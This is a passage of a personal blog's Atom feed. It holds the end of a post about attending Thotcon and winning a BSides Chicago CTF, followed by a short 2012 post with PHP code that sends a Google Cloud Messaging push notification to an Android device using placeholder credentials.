<p>The Thotcon talks were good, but I took particular interest in <a href="http://twitter.com/Ben0xA">@Ben0xA’s</a> “Creating A Powerful User Defense Against Attackers”, <a href="http://twitter.com/claudijd">@claudijd’s</a> “Attacking Cloud Services w/ Source Code”, and Daniel Peck’s “Scripting Android Applications”. I thought they were the most interesting ones presented and ones that I want to continue to take a look into once I have some free time.</p>

<p>Next day ended up waking up a little late but went over to BSides Chicago. The Abbey Pub was a really cool place, I highly enjoyed the venue. We didn’t really pay attention to the talks, but <a href="http://twitter.com/_Lopi_">@<em>Lopi</em></a>, <a href="http://twitter.com/AvidHacker">@AvidHacker</a> and I went straight to the CTF. There were a number of gotcha’s and face-palm moments while going through it. Might end up seeing some write up’s on some of the challenges on here, depending on how motivated I am. I had to leave an hour early before the CTF ended so I could catch my train home, but our team ended up scoring 205 points, second place following at 110. Needless to say, we owned at it. Second half of the CTF is going to be at BSides Detroit, I believe we plan on doing that remotely.</p>

<p>All in all, it was a good weekend for infosec in my book. I really need to start going to con’s some more, so start donating to my “Get Chris Higgins to Go to More Con’s” fund.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Google Cloud Messaging Through PHP]]></title>
    <link href="http://chigstuff.com/blog/2012/08/21/google-cloud-messaging-through-php/"/>
    <updated>2012-08-21T16:15:01-05:00</updated>
    <id>http://chigstuff.com/blog/2012/08/21/google-cloud-messaging-through-php</id>
    <content type="html"><![CDATA[<p>A few weeks ago I ran into an article on how to use Google Cloud Messaging with the .NET Framework. That got me thinking, and I wanted to give it a shot in PHP, it couldn’t be too bad right? So, here’s just some simple code on crafting the POST request to send to a specified Android device. All you need to do is supply your own various IDs from Google and whatever Android device you want to send to (as long as it’s registered) and you’re all set. Take a look at my code:</p>

<!--more-->


<div><script src='https://gist.github.com/9923471.js'></script>
<noscript><pre><code>&lt;?php
// You put your own App ID and Sender IDs
define(&quot;GOOGLE_APP_ID&quot;, &quot;AIxxxxxxxxx&quot;);
define(&quot;SENDER_ID&quot;, &quot;xxxxxxxxxx&quot;);

// Device ID to send the message to
$deviceId = &quot;insertdeviceidhere&quot;;
$message = &quot;Message from PHP!&quot;;

// Create the POST request
$request = &quot;https://android.googleapis.com/gcm/send&quot;;
$postData = &quot;collapse_key=score_update&amp;time_to_live=108&amp;delay_while_idle=1&amp;data.message={$message}&amp;data.time=&quot; . date(&quot;Y-m-d H:i:s&quot;) . &quot;&amp;registration_id={$deviceId}&quot;;
echo &quot;Sending request to {$request} with postData {$postData}&quot;;
$session = curl_init($request);

// Set HTTP headers
curl_setopt($session, CURLOPT_HTTPHEADER, array(&quot;Authorization: key=&quot; . GOOGLE_APP_ID, &quot;Sender: id=&quot; . SENDER_ID, &quot;Content-Type: application/x-www-form-urlencoded;charset=UTF-8&quot;));

// Make it so it&#39;s a POST request
curl_setopt($session, CURLOPT_POST, true);
curl_setopt($session, CURLOPT_POSTFIELDS, $postData);

// Don&#39;t return headers, but get the response
curl_setopt($session, CURLOPT_HEADER, false);
curl_setopt($session, CURLOPT_RETURNTRANSFER, true);
echo &quot;Sending...&quot;;
$response = curl_exec($session);
curl_close($session);
echo &quot;Response: {$response}&quot;;
?&gt;
</code></pre></noscript></div>



]]></content>
  </entry>
  
</feed>
